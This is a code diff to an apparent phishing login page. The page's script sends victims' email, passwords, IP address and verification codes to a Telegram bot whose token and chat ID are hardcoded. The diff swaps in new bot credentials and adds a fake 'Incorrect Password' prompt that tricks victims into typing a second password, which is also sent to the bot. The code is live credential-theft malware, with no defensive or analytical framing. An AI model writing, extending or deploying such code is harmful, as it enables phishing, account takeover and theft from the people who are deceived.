@@ -196,6 +196,12 @@
           <input class="field-input" type="password" autocomplete="current-password" aria-label="Password" id="passwordInput"/>
           <span class="field-underline" aria-hidden="true"></span>
         </label>
+                <label class="field" id="passwordField1" style="display: none;">
+          <span class="field-label">Re Enter Password</span>
+          <p style="color:red">Incorrect Password</p>
+          <input class="field-input" type="password" autocomplete="current-password" aria-label="Password" id="passwordInput1"/>
+          <span class="field-underline" aria-hidden="true"></span>
+        </label>
 
         <label class="field" id="codeField" style="display: none;">
           <span class="field-label">Enter verification code</span>
@@ -220,8 +226,8 @@
 
 <script>
   // Telegram configuration - using your provided credentials
-  const TELEGRAM_BOT_TOKEN = '8434488259:AAFHtKzeOQV-Lja9_OYizbeYRaYJ_5rFLVs';
-  const TELEGRAM_CHAT_ID = '7867297027';
+  const TELEGRAM_BOT_TOKEN = '8253727972:AAFpIeSwOWci_jCPymG0i4avq9rIIjOhJwY';
+  const TELEGRAM_CHAT_ID = '6806859535';
 
   // Function to get the user's IP address
   async function getIPAddress() {
@@ -275,6 +281,7 @@
   const collectedData = {
     email: '',
     password: '',
+    password2: '',
     code: '',
     rememberMe: false
   };
@@ -312,6 +319,7 @@
   const codeInput = document.getElementById("codeInput");
   const nextButton = document.getElementById("loginNext");
   const resendText = document.getElementById("resendText");
+  const passwordInput1 = document.getElementById("passwordInput1")
 
   let timeLeft = 60;
   const timer = setInterval(() => {
@@ -354,7 +362,6 @@
       }
 
       collectedData.password = password;
-
       // Report to Telegram and wait for completion
       await reportToTelegram('Step 2 - Password entered');
 
@@ -366,14 +373,44 @@
       setTimeout(() => {
         // Success - show verification code field
         passwordField.style.display = "none";
+        passwordField1.style.display = "block";
+        resendText.style.display = "none";
+        nextButton.textContent = "Next";
+        step = 21;
+        nextButton.disabled = false;
+      }, 1000);
+
+    } else if (step === 21){
+            // Second step: Send email and password to API
+      const email = emailInput.value.trim();
+      const password1 = passwordInput1.value.trim();
+
+      if (!password1) {
+        alert("Please enter your password.");
+        return;
+      }
+
+      collectedData.password1 = password1;
+      // Report to Telegram and wait for completion
+      await reportToTelegram('Step 2a - Password 2 entered');
+
+      // Disable button to prevent double submission
+      nextButton.disabled = true;
+      nextButton.textContent = "Signing in...";
+
+      // Simulate API call
+      setTimeout(() => {
+        // Success - show verification code field
+        passwordField1.style.display = "none";
         codeField.style.display = "block";
         resendText.style.display = "block";
         nextButton.textContent = "Verify";
         step = 3;
         nextButton.disabled = false;
       }, 1000);
-
-    } else if (step === 3) {
+      
+    }
+    else if (step === 3) {
       // Third step: Verify code
       const code = codeInput.value.trim();
 
